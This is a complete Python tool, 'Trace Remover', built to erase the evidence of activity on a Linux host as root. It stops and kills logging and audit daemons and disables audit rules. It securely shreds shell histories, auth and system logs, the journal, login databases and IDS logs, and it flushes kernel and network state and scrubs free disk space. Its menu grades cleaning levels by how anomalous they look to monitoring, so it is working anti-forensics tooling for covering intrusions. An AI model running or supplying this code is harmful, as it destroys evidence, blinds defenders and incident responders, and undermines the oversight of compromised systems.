#!/usr/bin/env python3
import os
import sys
import subprocess
import shutil
import glob
import time
from pathlib import Path
os.system("clear" if os.name == "posix" else "cls")

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

ASCII_BANNER = rf"""{CYAN}{BOLD}
  _____                     ____                                     
 |_   _| __ __ _  ___ ___  |  _ \ ___ _ __ ___   _____   _____ _ __ 
   | || '__/ _` |/ __/ _ \ | |_) / _ \ '_ ` _ \ / _ \ \ / / _ \ '__|
   | || | | (_| | (_|  __/ |  _ <  __/ | | | | | (_) \ V /  __/ |   
   |_||_|  \__,_|\___\___| |_| \_\___|_| |_| |_|\___/ \_/ \___|_|   
                                                        v1.0.0 (Ultra)
{RESET}"""

def cprint(msg, color=GREEN):
    print(f"{color}{msg}{RESET}")

def run(cmd, silent=True, timeout=180):
    try:
        r = subprocess.run(
            cmd, shell=True,
            stdout=subprocess.DEVNULL if silent else None,
            stderr=subprocess.DEVNULL if silent else None,
            timeout=timeout
        )
        return r.returncode
    except Exception:
        return -1

def have(bin_name):
    return shutil.which(bin_name) is not None

def systemctl(action, unit):
    run(f"systemctl {action} --no-block {unit} 2>/dev/null")

def multi_pass_overwrite(path, passes=7):
    p = str(path)
    if not os.path.exists(p):
        return False
    try:
        if have("shred"):
            run(f"shred -n {passes} -z -u -- '{p}'")
            return not os.path.exists(p)
        if have("wipe"):
            run(f"wipe -rfq '{p}'")
            return not os.path.exists(p)
    except Exception:
        pass
    try:
        size = os.path.getsize(p) or 4096
        with open(p, "r+b", buffering=0) as f:
            for i in range(passes):
                f.seek(0)
                if i % 3 == 0:
                    f.write(os.urandom(size))
                elif i % 3 == 1:
                    f.write(b"\x00" * size)
                else:
                    f.write(b"\xFF" * size)
                f.flush()
                os.fsync(f.fileno())
        os.remove(p)
        return True
    except Exception:
        try:
            os.remove(p)
        except Exception:
            pass
        return False

def secure_delete(path, passes=7):
    p = Path(path)
    if not p.exists() and not p.is_symlink():
        return
    try:
        if p.is_symlink() or p.is_file():
            multi_pass_overwrite(p, passes)
        elif p.is_dir():
            for root, dirs, files in os.walk(p, topdown=False):
                for name in files:
                    multi_pass_overwrite(Path(root) / name, passes)
                for name in dirs:
                    try:
                        os.rmdir(Path(root) / name)
                    except Exception:
                        pass
            try:
                p.rmdir()
            except Exception:
                shutil.rmtree(p, ignore_errors=True)
    except Exception:
        shutil.rmtree(p, ignore_errors=True)

def wipe_binary_log(path, mode=0o664, uid=0, gid=0, seed_minimal=True):
    p = str(path)
    if os.path.exists(p):
        multi_pass_overwrite(p, passes=5)
    try:
        with open(p, "wb") as f:
            if seed_minimal and any(x in p for x in ["wtmp", "btmp", "lastlog", "utmp"]):
                f.write(b"\x00" * 384 * 4)
            else:
                f.write(b"")
        os.chmod(p, mode)
        try:
            os.chown(p, uid, gid)
        except Exception:
            pass
    except Exception:
        pass

def glob_secure(patterns, passes=5):
    for pattern in patterns:
        for f in glob.glob(pattern, recursive=True):
            try:
                secure_delete(f, passes)
            except Exception:
                pass

def kill_log_writers(soft=False):
    cprint("[*] Stopping log writers...", CYAN)
    units = [
        "systemd-journald.socket", "systemd-journald", "systemd-journald-dev-log.socket",
        "rsyslog", "syslog-ng", "syslog",
        "auditd", "auditd.service",
        "acct", "psacct",
        "systemd-coredump.socket", "systemd-coredump",
        "fail2ban",
        "cron", "crond", "anacron",
    ]
    for u in units:
        systemctl("stop", u)
        if not soft:
            systemctl("kill", u)

    if not soft:
        for k in ["pkill -9 rsyslogd", "pkill -9 syslog-ng", "pkill -9 journald"]:
            run(k)
        if have("auditctl"):
            run("auditctl -e 0")
            run("auditctl -D")
    time.sleep(0.6)
    cprint("[+] Log writers stopped", GREEN)

def restart_minimal():
    for u in ["systemd-journald.socket", "systemd-journald", "rsyslog", "cron", "crond"]:
        systemctl("start", u)

def clear_shell_histories(level=2):
    cprint("[*] Annihilating shell & REPL histories + editor artifacts...", CYAN)
    hist_names = [
        ".bash_history", ".zsh_history", ".sh_history", ".history",
        ".python_history", ".python_history.*", ".ipython",
        ".mysql_history", ".psql_history", ".sqlite_history",
        ".lesshst", ".viminfo", ".nano_history",
        ".irb_history", ".node_repl_history", ".Rhistory",
        ".wget-hsts", ".curl_history",
        ".zsh_sessions", ".zcompdump", ".zcompdump-*",
        ".local/share/fish/fish_history",
        ".local/share/recently-used.xbel",
        ".*.swp", ".*.swo", ".*.swn",
        ".vim/undo/*", ".vim/.netrwhist",
        "*~", "*.bak", "*.old",
    ]
    homes = ["/root"] + glob.glob("/home/*") + ["/etc/skel"]
    passes = 3 if level == 1 else 5 if level == 2 else 7
    for home in homes:
        for name in hist_names:
            for p in glob.glob(f"{home}/{name}"):
                secure_delete(p, passes=passes)
        for p in glob.glob(f"{home}/.*history*"):
            secure_delete(p, passes=passes)
        for p in glob.glob(f"{home}/.*_history*"):
            secure_delete(p, passes=passes)
        for p in glob.glob(f"{home}/.vim/undo/*"):
            secure_delete(p, passes=passes)
    for p in glob.glob("/tmp/.*.swp") + glob.glob("/var/tmp/.*.swp"):
        secure_delete(p, passes=passes)
    cprint("[+] Shell + editor artifacts destroyed", GREEN)

def clear_auth_and_system_logs(level=2):
    cprint("[*] Destroying authentication, system & rotated logs...", CYAN)
    patterns = [
        "/var/log/auth.log*", "/var/log/secure*", "/var/log/secure-*",
        "/var/log/messages*", "/var/log/messages-*",
        "/var/log/syslog*", "/var/log/kern.log*", "/var/log/daemon.log*",
        "/var/log/user.log*", "/var/log/debug*", "/var/log/warn*",
        "/var/log/cron*", "/var/log/crond*", "/var/log/maillog*",
        "/var/log/mail.log*", "/var/log/mail.err*", "/var/log/mail.warn*",
        "/var/log/dpkg.log*", "/var/log/apt/*", "/var/log/aptitude*",
        "/var/log/yum.log*", "/var/log/dnf.log*", "/var/log/dnf.librepo.log*",
        "/var/log/hawkey.log*", "/var/log/alternatives.log*",
        "/var/log/bootstrap.log*",
        "/var/log/installer/*", "/var/log/landscape/*",
        "/var/log/unattended-upgrades/*", "/var/log/ubuntu-advantage*",
        "/var/log/popularity-contest*", "/var/log/apport.log*",
        "/var/log/dist-upgrade/*",
        "/var/log/fail2ban*", "/var/log/ufw.log*", "/var/log/firewalld*",
        "/var/log/nftables*", "/var/log/iptables*",
        "/var/log/sssd/*", "/var/log/samba/*", "/var/log/nginx/*",
        "/var/log/apache2/*", "/var/log/httpd/*", "/var/log/mysql/*",
        "/var/log/mariadb/*", "/var/log/postgresql/*", "/var/log/redis/*",
        "/var/log/rabbitmq/*", "/var/log/elasticsearch/*",
        "/var/log/docker*", "/var/log/containers/*", "/var/log/pods/*",
        "/var/lib/docker/containers/*/*-json.log",
        "/var/log/openvpn*", "/var/log/ppp/*", "/var/log/vpn*",
        "/var/log/ntp*", "/var/log/chrony/*",
        "/var/log/cloud-init*", "/var/log/waagent*", "/var/log/azure/*",
        "/var/log/amazon/*", "/var/log/google-*", "/var/log/gce*",
        "/var/log/ossec/*", "/var/log/aide/*", "/var/log/tripwire/*",
        "/var/log/lynis*", "/var/log/rkhunter*", "/var/log/chkrootkit*",
        "/var/log/snort/*", "/var/log/suricata/*",
        "/var/log/Xorg*", "/var/log/gdm/*", "/var/log/lightdm/*",
        "/var/log/sddm*", "/var/log/cups/*",
        "/var/log/*.log", "/var/log/*.log.*", "/var/log/*/*.log",
        "/var/log/*/*.log.*",
    ]
    passes = 3 if level == 1 else 5 if level <= 3 else 7
    glob_secure(patterns, passes=passes)
    cprint("[+] Auth & system logs destroyed", GREEN)

def clear_journal(level=2):
    cprint("[*] Annihilating systemd journal...", CYAN)
    for d in ["/var/log/journal", "/run/log/journal", "/var/lib/systemd/catalog"]:
        if os.path.isdir(d):
            secure_delete(d, passes=2 if level == 1 else 3)
    run("journalctl --rotate 2>/dev/null")
    run("journalctl --vacuum-time=1s 2>/dev/null")
    run("journalctl --vacuum-size=1K 2>/dev/null")
    cprint("[+] Journal destroyed", GREEN)

def clear_audit(level=2):
    cprint("[*] Destroying audit subsystem...", CYAN)
    for f in glob.glob("/var/log/audit/*"):
        secure_delete(f, passes=3 if level == 1 else 5)
    if level >= 2:
        for f in glob.glob("/etc/audit/rules.d/*") + glob.glob("/etc/audit/audit.rules*"):
            multi_pass_overwrite(f, passes=3)
            try:
                open(f, "w").close()
            except Exception:
                pass
    if have("auditctl") and level >= 2:
        run("auditctl -D")
        run("auditctl -e 0")
    cprint("[+] Audit destroyed", GREEN)

def clear_process_accounting(level=2):
    cprint("[*] Destroying process accounting (pacct)...", CYAN)
    for d in ["/var/log/account", "/var/account"]:
        for f in glob.glob(f"{d}*"):
            secure_delete(f, passes=3 if level == 1 else 5)
    for f in glob.glob("/var/log/pacct*"):
        secure_delete(f, passes=3 if level == 1 else 5)
    cprint("[+] Process accounting destroyed", GREEN)

def clear_binary_login_logs(level=2):
    cprint("[*] Wiping binary login databases...", CYAN)
    targets = [
        "/var/log/wtmp", "/var/log/wtmp-*", "/var/log/wtmp.*",
        "/var/log/btmp", "/var/log/btmp-*", "/var/log/btmp.*",
        "/var/log/lastlog", "/var/log/lastlog-*",
        "/var/log/faillog", "/var/log/faillog-*",
        "/run/utmp", "/var/run/utmp", "/var/log/utmp",
        "/var/log/tallylog",
        "/etc/security/opasswd",
    ]
    for pattern in targets:
        for p in glob.glob(pattern):
            mode = 0o600 if "opasswd" in p or "tallylog" in p else 0o664
            wipe_binary_log(p, mode=mode, seed_minimal=(level >= 2))
    cprint("[+] Binary login logs wiped", GREEN)

def clear_tmp_cache_coredumps(level=2):
    cprint("[*] Destroying temp, cache, coredumps...", CYAN)
    patterns = [
        "/tmp/*", "/var/tmp/*", "/dev/shm/*",
        "/var/cache/*", "/var/spool/mail/*",
        "/var/lib/systemd/coredump/*",
        "/var/crash/*", "/var/spool/crash/*", "/var/spool/abrt/*",
        "/root/.cache/*", "/root/.local/share/Trash/*",
        "/root/.local/share/recently-used.xbel",
    ]
    if level >= 2:
        for home in glob.glob("/home/*"):
            patterns += [
                f"{home}/.cache/*",
                f"{home}/.local/share/Trash/*",
                f"{home}/.local/share/recently-used.xbel",
                f"{home}/.thumbnails/*",
            ]
    glob_secure(patterns, passes=3 if level == 1 else 4)
    cprint("[+] Temp / cache / coredumps destroyed", GREEN)

def clear_ssh_and_network_artifacts(level=2):
    cprint("[*] Cleaning SSH artifacts + network state...", CYAN)
    patterns = ["/var/log/sshd*", "/var/log/ssh.log*"]
    glob_secure(patterns, passes=3 if level == 1 else 5)
    run("rm -rf /tmp/ssh-* 2>/dev/null")
    run("rm -rf /run/user/*/ssh-* 2>/dev/null")
    if level >= 3:
        run("ip -s -s neigh flush all 2>/dev/null")
        if have("conntrack"):
            run("conntrack -F 2>/dev/null")
        run("echo > /proc/net/nf_conntrack 2>/dev/null")
    cprint("[+] SSH + network state cleaned", GREEN)

def clear_dmesg_and_kernel(level=2):
    cprint("[*] Clearing dmesg & kernel ring buffers...", CYAN)
    run("dmesg -C 2>/dev/null || dmesg -c > /dev/null 2>&1")
    if level >= 2:
        run("echo > /dev/kmsg 2>/dev/null")
    cprint("[+] Kernel buffers cleared", GREEN)

def clear_cloud_and_instance_data(level=2):
    if level < 2:
        return
    cprint("[*] Destroying cloud-init / instance metadata traces...", CYAN)
    for d in [
        "/var/lib/cloud/instance", "/var/lib/cloud/instances",
        "/var/lib/cloud/data", "/var/lib/cloud/sem",
        "/var/lib/cloud/scripts", "/var/lib/waagent",
    ]:
        if os.path.isdir(d):
            secure_delete(d, passes=3 if level == 2 else 4)
    for f in glob.glob("/var/log/waagent*") + glob.glob("/var/log/azure/*") + \
             glob.glob("/var/log/cloud-init*"):
        secure_delete(f, passes=4)
    cprint("[+] Cloud traces destroyed", GREEN)

def clear_package_and_system_state(level=2):
    if level < 2:
        return
    cprint("[*] Cleaning package manager state & history...", CYAN)
    extra = [
        "/var/lib/apt/lists/*", "/var/cache/apt/archives/*",
        "/var/lib/dpkg/lock*", "/var/lib/dpkg/updates/*",
        "/var/log/apt/*",
        "/var/lib/yum/history/*", "/var/lib/dnf/history/*",
        "/var/log/dnf.rpm.log*", "/var/log/hawkey.log*",
        "/var/lib/zypp/history", "/var/log/zypper.log*",
    ]
    glob_secure(extra, passes=3)
    for f in ["/var/lib/systemd/random-seed", "/var/lib/urandom/random-seed"]:
        if os.path.exists(f):
            multi_pass_overwrite(f, passes=3)
            try:
                open(f, "wb").close()
            except Exception:
                pass
    cprint("[+] Package & state cleaned", GREEN)

def clear_user_runtime(level=2):
    if level < 3:
        return
    cprint("[*] Cleaning user runtime directories...", CYAN)
    for d in glob.glob("/run/user/*"):
        for sub in ["systemd", "pulse", "gvfs", "keyring", "dconf"]:
            secure_delete(f"{d}/{sub}", passes=2)
    cprint("[+] User runtime cleaned", GREEN)

def clear_open_deleted_fds(level=3):
    if level < 3:
        return
    cprint("[*] Scanning for processes holding deleted log fds...", CYAN)
    try:
        for pid in os.listdir("/proc"):
            if not pid.isdigit():
                continue
            fd_dir = f"/proc/{pid}/fd"
            if not os.path.isdir(fd_dir):
                continue
            for fd in os.listdir(fd_dir):
                try:
                    target = os.readlink(f"{fd_dir}/{fd}")
                    if "(deleted)" in target and any(x in target for x in ["/var/log", "journal", "audit"]):
                        run(f"kill -9 {pid}")
                        break
                except Exception:
                    pass
    except Exception:
        pass
    cprint("[+] Open deleted fds handled", GREEN)

def attempt_blkdiscard(level=3):
    if level < 3:
        return
    cprint("[*] Attempting fstrim (SSD TRIM)...", CYAN)
    if have("fstrim"):
        run("fstrim -av 2>/dev/null")
    cprint("[+] TRIM requested", GREEN)

def scrub_free_space(aggressive=False):
    cprint("[*] Free-space scrub starting (this takes time)...", CYAN)
    if have("sfill"):
        for target in ["/var/log", "/var/tmp", "/tmp", "/root", "/home"]:
            if os.path.isdir(target):
                run(f"sfill -f -z '{target}'", silent=True, timeout=900)
        cprint("[+] sfill free-space scrub done", GREEN)
        return
    targets = ["/var/log", "/var/tmp", "/tmp"]
    if aggressive:
        targets += ["/root", "/home"]
    for target in targets:
        if not os.path.isdir(target):
            continue
        try:
            usage = shutil.disk_usage(target)
            free = usage.free
            pad = free - (128 * 1024 * 1024)
            if pad < 50 * 1024 * 1024:
                continue
            tmpfile = os.path.join(target, f".scrub_{os.getpid()}")
            chunk = 64 * 1024 * 1024
            written = 0
            with open(tmpfile, "wb") as f:
                while written < pad:
                    to_write = min(chunk, pad - written)
                    f.write(b"\x00" * to_write)
                    f.flush()
                    written += to_write
            os.remove(tmpfile)
        except Exception as e:
            cprint(f"[!] scrub error on {target}: {e}", YELLOW)
    run("sync")
    cprint("[+] Free-space scrub finished", GREEN)

def harden_current_session():
    os.environ["HISTFILE"] = "/dev/null"
    os.environ["HISTSIZE"] = "0"
    os.environ["HISTFILESIZE"] = "0"
    os.environ["HISTCONTROL"] = "ignorespace:ignoredups"
    run("set +o history 2>/dev/null")
    for home in ["/root"] + glob.glob("/home/*"):
        hf = f"{home}/.bash_history"
        if os.path.exists(hf):
            multi_pass_overwrite(hf, passes=3)
            try:
                open(hf, "w").close()
            except Exception:
                pass

def show_menu():
    print(ASCII_BANNER)
    print(f"""{CYAN}{BOLD}
╔══════════════════════════════════════════════════════════════════╗
║              TRACE REMOVER v1.0.0  —  POWER MENU                 ║
║         Choose how hard you want the clean to be                 ║
╚══════════════════════════════════════════════════════════════════╝
{RESET}
{GREEN}  [1] Soft{RESET}
      Light clean. Minimal service disruption.
      History + main logs + binary login DBs.
      Lowest noise. Good for quick hygiene.

{YELLOW}  [2] Standard{RESET}
      Balanced thorough clean (recommended).
      + journal, audit, pacct, cloud, package history.
      Moderate noise.

{RED}  [3] Ultra{RESET}
      Aggressive.
      + network state flush, open-fd kill, fstrim, user runtime.
      Higher chance of looking anomalous.

{RED}{BOLD}  [4] Nuclear{RESET}
      Maximum reachable destruction.
      Everything in Ultra + free-space scrub (slow).
      Highest impact on disk + most obvious if monitored.

{CYAN}  [0] Exit{RESET}
""")

def main():
    if os.geteuid() != 0:
        cprint("[!] Root required. Use: sudo python3 trace_remover.py", RED)
        sys.exit(1)

    # allow CLI override still
    if "--soft" in sys.argv:
        level = 1
    elif "--nuclear" in sys.argv:
        level = 4
    elif "--ultra" in sys.argv or "--scrub" in sys.argv:
        level = 3
    else:
        show_menu()
        try:
            choice = input(f"{BOLD}Select power level [1-4]: {RESET}").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nAborted.")
            sys.exit(0)

        if choice == "0":
            print("Exiting.")
            sys.exit(0)
        if choice not in ("1", "2", "3", "4"):
            cprint("[!] Invalid choice.", RED)
            sys.exit(1)
        level = int(choice)

    names = {1: "SOFT", 2: "STANDARD", 3: "ULTRA", 4: "NUCLEAR"}
    print(f"\n{YELLOW}Selected: {names[level]}{RESET}")
    print(f"{YELLOW}[!] Complete eradication from a live OS is impossible.{RESET}")
    print(f"{YELLOW}[!] SIEM / cloud / hypervisor / SSD FTL / RAM remain out of reach.{RESET}")
    confirm = input(f"{RED}{BOLD}Type '{names[level]}' to confirm: {RESET}").strip()
    if confirm != names[level]:
        print("Aborted.")
        sys.exit(0)

    soft = (level == 1)
    do_scrub = (level == 4)
    aggressive = (level == 4)

    t0 = time.time()

    kill_log_writers(soft=soft)
    clear_shell_histories(level)
    clear_auth_and_system_logs(level)
    clear_journal(level)
    clear_audit(level)
    clear_process_accounting(level)
    clear_binary_login_logs(level)
    clear_tmp_cache_coredumps(level)
    clear_ssh_and_network_artifacts(level)
    clear_dmesg_and_kernel(level)
    clear_cloud_and_instance_data(level)
    clear_package_and_system_state(level)
    clear_user_runtime(level)
    clear_open_deleted_fds(level)
    attempt_blkdiscard(level)

    if do_scrub:
        scrub_free_space(aggressive=aggressive)

    harden_current_session()
    if level >= 2:
        restart_minimal()
    run("sync")
    elapsed = time.time() - t0

    print(f"""
{GREEN}{BOLD}══════════════════════════════════════════════════════════════════
[✓] {names[level]} CLEAN COMPLETE in {elapsed:.1f}s
══════════════════════════════════════════════════════════════════{RESET}
{YELLOW}Remaining reality:{RESET}
  • Already-shipped SIEM / cloud logs → untouchable
  • SSD FTL orphaned blocks → need Secure Erase / nvme format
  • RAM + eBPF → die only on reboot

{YELLOW}Current shell still needs:{RESET}
  history -c && history -w
  unset HISTFILE

{GREEN}Reboot recommended.{RESET}
""")

if __name__ == "__main__":
    main()
